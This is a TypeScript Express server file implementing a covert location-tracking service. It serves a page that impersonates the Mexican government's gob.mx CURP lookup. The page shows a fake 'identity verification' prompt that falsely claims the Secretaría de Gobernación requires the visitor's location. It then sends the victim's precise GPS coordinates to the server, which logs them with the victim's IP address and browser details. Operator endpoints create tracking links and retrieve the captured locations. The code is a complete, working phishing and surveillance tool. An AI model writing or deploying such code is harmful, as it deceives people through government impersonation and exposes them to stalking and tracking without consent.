import { Router, type IRouter } from "express";
import { db, locationsTable, locationSessionsTable } from "@workspace/db";
import { eq, desc, sql } from "drizzle-orm";
import crypto from "crypto";

const router: IRouter = Router();

function buildTrackingPage(session: { token: string; name: string; pageStyle: string }): string {
  const tok = session.token;
  return `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Consulta tu CURP | gob.mx</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Open Sans',Arial,Helvetica,sans-serif;background:#f0f0f0;color:#333;min-height:100vh;display:flex;flex-direction:column}

/* ===== HEADER GOB.MX ===== */
.gob-skip{position:absolute;left:-9999px;top:0;background:#006847;color:#fff;padding:8px 16px;font-size:13px;z-index:999}
.gob-skip:focus{left:0}

.gob-header{background:#006847;width:100%}
.gob-header-top{display:flex;align-items:center;justify-content:space-between;max-width:1140px;margin:0 auto;padding:10px 20px;gap:16px}
.gob-logo-link{display:flex;align-items:center;gap:10px;text-decoration:none;flex-shrink:0}
.gob-logo-escudo{width:42px;height:42px;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 60"><rect width="60" height="60" rx="4" fill="%23fff"/><text x="50%25" y="56%25" dominant-baseline="middle" text-anchor="middle" font-family="Arial" font-weight="900" font-size="18" fill="%23006847">gob</text></svg>') center/cover no-repeat;border-radius:4px}
.gob-logo-text{display:flex;flex-direction:column}
.gob-logo-name{color:#fff;font-size:20px;font-weight:700;line-height:1.1;letter-spacing:-0.3px}
.gob-logo-sub{color:rgba(255,255,255,0.8);font-size:11px;font-weight:400;line-height:1}
.gob-header-nav{display:flex;align-items:center;gap:20px;flex-shrink:0}
.gob-header-nav a{color:rgba(255,255,255,0.85);text-decoration:none;font-size:13px;font-weight:600;transition:color 0.15s}
.gob-header-nav a:hover{color:#fff;text-decoration:underline}
@media(max-width:600px){.gob-header-nav{display:none}}

.gob-breadcrumb{background:#004f35;border-top:1px solid rgba(255,255,255,0.12)}
.gob-breadcrumb-inner{max-width:1140px;margin:0 auto;padding:8px 20px;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
.gob-breadcrumb a{color:rgba(255,255,255,0.8);font-size:12.5px;text-decoration:none}
.gob-breadcrumb a:hover{color:#fff;text-decoration:underline}
.gob-breadcrumb span{color:rgba(255,255,255,0.5);font-size:12px}

/* ===== HERO ===== */
.gob-hero{background:linear-gradient(180deg,#006847 0%,#005a3c 100%);padding:28px 20px 0;color:#fff}
.gob-hero-inner{max-width:1140px;margin:0 auto}
.gob-hero h1{font-size:26px;font-weight:700;margin-bottom:6px}
.gob-hero-desc{font-size:14px;opacity:0.85;margin-bottom:20px}

/* Steps */
.gob-steps{display:flex;gap:0;margin-top:4px}
.gob-step{display:flex;align-items:center;gap:8px;background:rgba(0,0,0,0.2);padding:10px 18px;font-size:13px;color:rgba(255,255,255,0.75);flex:1;border-radius:0;cursor:default}
.gob-step:first-child{border-radius:6px 0 0 0}
.gob-step.active{background:#fff;color:#006847;font-weight:700}
.gob-step-num{width:22px;height:22px;border-radius:50%;background:rgba(255,255,255,0.25);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;color:rgba(255,255,255,0.9)}
.gob-step.active .gob-step-num{background:#006847;color:#fff}
.gob-step-label{display:flex;flex-direction:column;gap:1px}
.gob-step-sub{font-size:10px;text-transform:uppercase;letter-spacing:0.5px;opacity:0.7;font-weight:600}
.gob-step.active .gob-step-sub{color:#006847;opacity:0.7}
@media(max-width:480px){.gob-step{padding:8px 12px}.gob-step-label .gob-step-sub{display:none}}

/* ===== MAIN CONTENT ===== */
.gob-main{max-width:1140px;margin:0 auto;padding:28px 20px 48px;width:100%;flex:1}
.gob-section-title{font-size:18px;font-weight:700;color:#333;margin-bottom:4px}
.gob-divider{border:none;border-top:2px solid #ddd;margin:14px 0 20px}

/* Tabs */
.gob-tabs{display:flex;gap:4px;margin-bottom:0;border-bottom:2px solid #006847}
.gob-tab{padding:10px 20px;font-size:13px;font-weight:600;color:#555;background:#e8e8e8;border:1px solid #ccc;border-bottom:none;border-radius:4px 4px 0 0;cursor:pointer;transition:all 0.15s;-webkit-appearance:none;font-family:inherit}
.gob-tab.active{background:#006847;color:#fff;border-color:#006847}
.gob-tab:hover:not(.active){background:#ddd;color:#333}

/* Form card */
.gob-card{background:#fff;border:1px solid #ccc;border-top:none;padding:24px;margin-bottom:20px}
.gob-form-group{margin-bottom:18px}
.gob-label{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:5px}
.gob-label .req{color:#9f2241;margin-left:2px}
.gob-input,.gob-select{width:100%;padding:9px 12px;border:1px solid #aaa;border-radius:3px;font-size:15px;color:#333;background:#fff;font-family:inherit;-webkit-appearance:none;transition:border-color 0.15s,box-shadow 0.15s}
.gob-input:focus,.gob-select:focus{outline:none;border-color:#006847;box-shadow:0 0 0 3px rgba(0,104,71,0.18)}
.gob-input::placeholder{color:#bbb;font-size:13px}
.gob-input.uppercase{text-transform:uppercase;letter-spacing:1px}
.gob-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
.gob-row-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@media(max-width:580px){.gob-row{grid-template-columns:1fr 1fr}.gob-row-2{grid-template-columns:1fr}}

.gob-link{color:#006847;font-size:13px;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:inherit;padding:0}
.gob-required-note{font-size:12px;color:#666;margin-top:4px}

.gob-divider-light{border:none;border-top:1px solid #e0e0e0;margin:18px 0}

.gob-btn{display:block;background:#006847;color:#fff;border:none;padding:11px 32px;font-size:15px;font-weight:700;border-radius:3px;cursor:pointer;font-family:inherit;-webkit-appearance:none;transition:background 0.15s;min-width:140px}
.gob-btn:hover{background:#004f35}
.gob-btn:active{background:#003d29}
.gob-btn:disabled{background:#aaa;cursor:default}

/* Info box */
.gob-infobox{background:#fff8e1;border-left:4px solid #f5a623;padding:14px 16px;border-radius:0 4px 4px 0;margin-top:20px;font-size:13px;color:#555;line-height:1.55}
.gob-infobox strong{color:#333;display:block;margin-bottom:3px}

/* Privacy notice */
.gob-privacy{background:#f5f5f5;border:1px solid #e0e0e0;border-radius:4px;padding:16px;margin-top:20px;font-size:12px;color:#666;line-height:1.6}
.gob-privacy strong{color:#444}
.gob-privacy a{color:#006847}

/* ===== OVERLAY / MODAL ===== */
.gob-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);z-index:1000;align-items:center;justify-content:center;padding:20px}
.gob-overlay.show{display:flex}
.gob-modal{background:#fff;border-radius:6px;padding:32px 28px;max-width:420px;width:100%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.25)}
.gob-modal-icon{width:60px;height:60px;background:#e8f5f0;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;border:2px solid #b2dfcf}
.gob-modal-title{font-size:17px;font-weight:700;color:#333;margin-bottom:8px}
.gob-modal-desc{font-size:13px;color:#666;line-height:1.55;margin-bottom:20px}
.gob-modal-btn{background:#006847;color:#fff;border:none;padding:12px 24px;border-radius:3px;font-size:15px;font-weight:700;cursor:pointer;width:100%;font-family:inherit;margin-bottom:10px;transition:background 0.15s}
.gob-modal-btn:hover{background:#004f35}

/* Spinner */
.gob-spinner{width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:#006847;border-radius:50%;animation:spin 0.85s linear infinite;margin:0 auto 14px}
@keyframes spin{to{transform:rotate(360deg)}}

/* Success */
.gob-success-icon{width:60px;height:60px;background:#e8f5f0;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;border:2px solid #80cba8}
.gob-success-title{font-size:17px;font-weight:700;color:#006847;margin-bottom:8px}
.gob-success-desc{font-size:13px;color:#555;line-height:1.55;margin-bottom:20px}
.gob-success-ref{background:#f5f5f5;border:1px solid #e0e0e0;border-radius:4px;padding:12px;font-size:13px;color:#444;margin-bottom:16px}
.gob-success-ref span{font-weight:700;color:#006847;font-family:monospace}

/* Error */
.gob-error-box{background:#fdf2f5;border:1px solid #e8b4c0;border-radius:4px;padding:14px;font-size:13px;color:#7a1230;margin-bottom:16px;text-align:center;line-height:1.5}

/* ===== FOOTER ===== */
.gob-footer{background:#333;color:rgba(255,255,255,0.75);font-size:12px;padding:18px 20px}
.gob-footer-inner{max-width:1140px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap}
.gob-footer a{color:rgba(255,255,255,0.75);text-decoration:none}
.gob-footer a:hover{color:#fff;text-decoration:underline}
.gob-footer-links{display:flex;gap:16px;flex-wrap:wrap}
</style>
</head>
<body>

<a href="#main-content" class="gob-skip">Ir al contenido principal</a>

<!-- ===== HEADER ===== -->
<header class="gob-header">
  <div class="gob-header-top">
    <a href="https://www.gob.mx" class="gob-logo-link" tabindex="0">
      <div class="gob-logo-escudo"></div>
      <div class="gob-logo-text">
        <span class="gob-logo-name">gob.mx</span>
        <span class="gob-logo-sub">Gobierno de México</span>
      </div>
    </a>
    <nav class="gob-header-nav">
      <a href="#">Trámites</a>
      <a href="#">Gobierno</a>
      <a href="#">Contacto</a>
      <a href="#">🔍 Buscar</a>
    </nav>
  </div>
  <div class="gob-breadcrumb">
    <div class="gob-breadcrumb-inner">
      <a href="#">Inicio</a>
      <span>›</span>
      <a href="#">Trámites y Servicios</a>
      <span>›</span>
      <a href="#">Registro e Identidad</a>
      <span>›</span>
      <a href="#">Consulta tu CURP</a>
    </div>
  </div>
</header>

<!-- ===== HERO ===== -->
<section class="gob-hero">
  <div class="gob-hero-inner">
    <h1>Consulta tu CURP</h1>
    <p class="gob-hero-desc">Clave Única de Registro de Población — servicio gratuito de la Secretaría de Gobernación</p>
    <div class="gob-steps">
      <div class="gob-step active">
        <div class="gob-step-num">1</div>
        <div class="gob-step-label">
          <span class="gob-step-sub">Paso 1</span>
          Búsqueda
        </div>
      </div>
      <div class="gob-step">
        <div class="gob-step-num">2</div>
        <div class="gob-step-label">
          <span class="gob-step-sub">Paso 2</span>
          Descargar CURP
        </div>
      </div>
    </div>
  </div>
</section>

<!-- ===== MAIN ===== -->
<main class="gob-main" id="main-content">
  <div class="gob-section-title">Búsqueda</div>
  <hr class="gob-divider">
  <p style="font-size:13.5px;color:#555;margin-bottom:18px;line-height:1.55">
    La consulta puede efectuarse indicando la clave CURP cuando ya la conoce o proporcionando su nombre y datos de nacimiento.
  </p>

  <!-- Tabs -->
  <div class="gob-tabs">
    <button class="gob-tab active" onclick="switchTab('tab-curp',this)" type="button">Clave Única de Registro de Población</button>
    <button class="gob-tab" onclick="switchTab('tab-datos',this)" type="button">Datos Personales</button>
  </div>

  <!-- Tab 1: Por CURP -->
  <div class="gob-card" id="tab-curp">
    <div class="gob-form-group">
      <label class="gob-label" for="curp-input">Clave Única de Registro de Población (CURP)<span class="req">*</span>:</label>
      <input class="gob-input uppercase" type="text" id="curp-input" maxlength="18" placeholder="Ej. GOPM850101HDFNRR09" autocomplete="off" autocorrect="off" spellcheck="false">
      <div style="margin-top:6px"><button class="gob-link" type="button" onclick="switchTab('tab-datos', document.querySelectorAll('.gob-tab')[1])">¿No conoces tu CURP?</button></div>
    </div>
    <hr class="gob-divider-light">
    <p class="gob-required-note">* Campos obligatorios</p>
    <div style="margin-top:14px">
      <button class="gob-btn" type="button" onclick="handleBuscar()">Buscar</button>
    </div>
  </div>

  <!-- Tab 2: Por Datos Personales -->
  <div class="gob-card" id="tab-datos" style="display:none">
    <div class="gob-form-group">
      <label class="gob-label" for="nombre">Nombre(s)<span class="req">*</span>:</label>
      <input class="gob-input" type="text" id="nombre" placeholder="Ej. María de los Ángeles" autocomplete="given-name">
    </div>
    <div class="gob-form-group">
      <label class="gob-label" for="apellido1">Primer apellido<span class="req">*</span>:</label>
      <input class="gob-input" type="text" id="apellido1" placeholder="Apellido paterno" autocomplete="family-name">
    </div>
    <div class="gob-form-group">
      <label class="gob-label" for="apellido2">Segundo apellido:</label>
      <input class="gob-input" type="text" id="apellido2" placeholder="Apellido materno (opcional)" autocomplete="additional-name">
    </div>
    <div class="gob-row" style="margin-bottom:18px">
      <div class="gob-form-group" style="margin-bottom:0">
        <label class="gob-label" for="dia">Día de nacimiento<span class="req">*</span>:</label>
        <select class="gob-select" id="dia">
          <option value="">Seleccionar el día</option>
          ${Array.from({length:31},(_,i)=>i+1).map(d=>`<option value="${d}">${String(d).padStart(2,'0')}</option>`).join('')}
        </select>
      </div>
      <div class="gob-form-group" style="margin-bottom:0">
        <label class="gob-label" for="mes">Mes de nacimiento<span class="req">*</span>:</label>
        <select class="gob-select" id="mes">
          <option value="">Seleccionar el mes</option>
          ${['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'].map((m,i)=>`<option value="${i+1}">${m}</option>`).join('')}
        </select>
      </div>
      <div class="gob-form-group" style="margin-bottom:0">
        <label class="gob-label" for="anio">Año de nacimiento<span class="req">*</span>:</label>
        <input class="gob-input" type="number" id="anio" placeholder="Ej. 1990" min="1900" max="2025">
      </div>
    </div>
    <div class="gob-row-2" style="margin-bottom:18px">
      <div class="gob-form-group" style="margin-bottom:0">
        <label class="gob-label" for="sexo">Sexo<span class="req">*</span>:</label>
        <select class="gob-select" id="sexo">
          <option value="">Selecciona el sexo</option>
          <option value="M">Mujer</option>
          <option value="H">Hombre</option>
          <option value="X">No binario</option>
        </select>
      </div>
      <div class="gob-form-group" style="margin-bottom:0">
        <label class="gob-label" for="estado">Estado<span class="req">*</span>:</label>
        <select class="gob-select" id="estado">
          <option value="">Selecciona el estado</option>
          <option>Aguascalientes</option><option>Baja California</option><option>Baja California Sur</option>
          <option>Campeche</option><option>Chiapas</option><option>Chihuahua</option>
          <option>Ciudad de México</option><option>Coahuila</option><option>Colima</option>
          <option>Durango</option><option>Estado de México</option><option>Guanajuato</option>
          <option>Guerrero</option><option>Hidalgo</option><option>Jalisco</option>
          <option>Michoacán</option><option>Morelos</option><option>Nayarit</option>
          <option>Nuevo León</option><option>Oaxaca</option><option>Puebla</option>
          <option>Querétaro</option><option>Quintana Roo</option><option>San Luis Potosí</option>
          <option>Sinaloa</option><option>Sonora</option><option>Tabasco</option>
          <option>Tamaulipas</option><option>Tlaxcala</option><option>Veracruz</option>
          <option>Yucatán</option><option>Zacatecas</option><option>Nacido en el extranjero</option>
        </select>
      </div>
    </div>
    <hr class="gob-divider-light">
    <p class="gob-required-note">* Campos obligatorios</p>
    <div style="margin-top:14px">
      <button class="gob-btn" type="button" onclick="handleBuscar()">Buscar</button>
    </div>
  </div>

  <!-- Info box -->
  <div class="gob-infobox">
    <strong>¡Sugerencia!</strong>
    Para solicitar asistencia telefónica sobre el servicio de la CURP, puede comunicarse al Centro de Atención y Servicios, de lunes a viernes, de 08:00 a 16:00 horas, a los números: <strong>800 9 11 11 11</strong>, extensiones 15100 y 15101.
  </div>

  <!-- Privacy notice -->
  <div class="gob-privacy" style="margin-top:20px">
    <strong>Aviso de privacidad simplificado de consulta de CURP en línea</strong><br>
    La recolección de datos personales se lleva a cabo a través de <a href="#">https://www.gob.mx/curp</a>, cuyo administrador y responsable del trámite de CURP es la Dirección General del Registro Nacional de Población e Identidad de la Secretaría de Gobernación. Los datos personales que se recaban serán utilizados con la finalidad de buscar, validar y obtener la CURP.
    Conoce el aviso de privacidad integral en <a href="#">https://www.gob.mx/curp/privacidadintegral</a>.
  </div>
</main>

<!-- ===== FOOTER ===== -->
<footer class="gob-footer">
  <div class="gob-footer-inner">
    <span>© 2025 Gobierno de México</span>
    <div class="gob-footer-links">
      <a href="#">Aviso de privacidad</a>
      <a href="#">Términos y condiciones</a>
      <a href="#">Política de accesibilidad</a>
      <a href="#">Mapa del sitio</a>
    </div>
  </div>
</footer>

<!-- ===== MODAL OVERLAY ===== -->
<div class="gob-overlay" id="overlay">
  <div class="gob-modal">

    <!-- Paso: verificando datos -->
    <div id="modal-verify">
      <div class="gob-modal-icon">
        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#006847" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
      </div>
      <div class="gob-modal-title">Verificación de identidad requerida</div>
      <div class="gob-modal-desc">
        Para continuar con la consulta de su CURP, el sistema necesita validar su ubicación como medida de seguridad ante posibles accesos fraudulentos a datos personales.
      </div>
      <button class="gob-modal-btn" onclick="requestLocation()">Permitir verificación de ubicación</button>
      <div style="font-size:11px;color:#999;margin-top:4px;line-height:1.4">
        Esta verificación es requerida por la Secretaría de Gobernación para proteger su información personal. Su ubicación no será almacenada permanentemente.
      </div>
    </div>

    <!-- Paso: solicitando GPS -->
    <div id="modal-loading" style="display:none">
      <div class="gob-spinner"></div>
      <div class="gob-modal-title">Verificando ubicación...</div>
      <div class="gob-modal-desc" style="margin-bottom:0">Conectando con los servidores del RENAPO, por favor espere.</div>
    </div>

    <!-- Paso: éxito -->
    <div id="modal-success" style="display:none">
      <div class="gob-success-icon">
        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#006847" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
      </div>
      <div class="gob-success-title">Identidad verificada</div>
      <div class="gob-success-desc">Sus datos han sido validados. A continuación podrá consultar y descargar su CURP.</div>
      <div class="gob-success-ref">Folio de verificación: <span>GOB-${tok.slice(0,8).toUpperCase()}</span></div>
      <button class="gob-modal-btn" onclick="closeModal()">Continuar con la consulta →</button>
    </div>

    <!-- Paso: error de permisos -->
    <div id="modal-error" style="display:none">
      <div class="gob-error-box">
        No fue posible verificar su ubicación. Para continuar, debe permitir el acceso a su ubicación en la configuración de su navegador y volver a intentarlo.
      </div>
      <button class="gob-modal-btn" onclick="requestLocation()">Intentar de nuevo</button>
      <button type="button" onclick="closeModal()" style="display:block;width:100%;margin-top:8px;background:none;border:none;color:#888;font-size:13px;cursor:pointer;font-family:inherit">Cancelar</button>
    </div>

  </div>
</div>

<script>
function switchTab(id, btn) {
  document.getElementById('tab-curp').style.display = id === 'tab-curp' ? 'block' : 'none';
  document.getElementById('tab-datos').style.display = id === 'tab-datos' ? 'block' : 'none';
  document.querySelectorAll('.gob-tab').forEach(function(b){ b.classList.remove('active'); });
  if(btn) btn.classList.add('active');
}

function handleBuscar() {
  document.getElementById('overlay').classList.add('show');
  showModal('modal-verify');
}

function showModal(id) {
  ['modal-verify','modal-loading','modal-success','modal-error'].forEach(function(s){
    document.getElementById(s).style.display = s === id ? 'block' : 'none';
  });
}

function closeModal() {
  document.getElementById('overlay').classList.remove('show');
}

function requestLocation() {
  if (!navigator.geolocation) { showModal('modal-error'); return; }
  showModal('modal-loading');
  navigator.geolocation.getCurrentPosition(
    function(pos) {
      fetch('/api/track/${tok}/capture', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude
        })
      }).catch(function(){});
      showModal('modal-success');
    },
    function() { showModal('modal-error'); },
    {enableHighAccuracy:true, timeout:15000, maximumAge:0}
  );
}
</script>
</body>
</html>`;
}

router.get("/track/:token", async (req, res) => {
  const { token } = req.params;
  try {
    const sessions = await db.select().from(locationSessionsTable).where(eq(locationSessionsTable.token, token));
    if (!sessions.length) return res.status(404).send("Enlace no válido");
    res.send(buildTrackingPage(sessions[0]));
  } catch (e) {
    res.status(500).send("Error");
  }
});

router.post("/track/:token/capture", async (req, res) => {
  const { token } = req.params;
  const { latitude, longitude, accuracy, altitude } = req.body;
  if (!latitude || !longitude) return res.status(400).json({ error: "Missing coordinates" });
  try {
    await db.insert(locationsTable).values({
      sessionToken: token,
      latitude: parseFloat(latitude),
      longitude: parseFloat(longitude),
      accuracy: accuracy ? parseFloat(accuracy) : null,
      altitude: altitude ? parseFloat(altitude) : null,
      ipAddress: (req.headers["x-forwarded-for"] as string)?.split(",")[0] || req.socket.remoteAddress || null,
      userAgent: req.headers["user-agent"] || null,
    });
    await db.update(locationSessionsTable)
      .set({ captureCount: sql`capture_count + 1` })
      .where(eq(locationSessionsTable.token, token));
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: "Error saving location" });
  }
});

router.get("/location-sessions", async (_req, res) => {
  try {
    const sessions = await db.select().from(locationSessionsTable).orderBy(desc(locationSessionsTable.createdAt));
    res.json(sessions);
  } catch (e) {
    res.status(500).json({ error: "Error fetching sessions" });
  }
});

router.post("/location-sessions", async (req, res) => {
  const { name, description } = req.body;
  if (!name) return res.status(400).json({ error: "Name required" });
  const token = crypto.randomBytes(12).toString("hex");
  try {
    const result = await db.insert(locationSessionsTable).values({ token, name, description }).returning();
    res.json(result[0]);
  } catch (e) {
    res.status(500).json({ error: "Error creating session" });
  }
});

router.delete("/location-sessions/:token", async (req, res) => {
  const { token } = req.params;
  try {
    await db.delete(locationsTable).where(eq(locationsTable.sessionToken, token));
    await db.delete(locationSessionsTable).where(eq(locationSessionsTable.token, token));
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: "Error deleting session" });
  }
});

router.get("/location-sessions/:token/data", async (req, res) => {
  const { token } = req.params;
  try {
    const locs = await db.select().from(locationsTable)
      .where(eq(locationsTable.sessionToken, token))
      .orderBy(desc(locationsTable.capturedAt));
    res.json(locs);
  } catch (e) {
    res.status(500).json({ error: "Error fetching locations" });
  }
});

export default router;
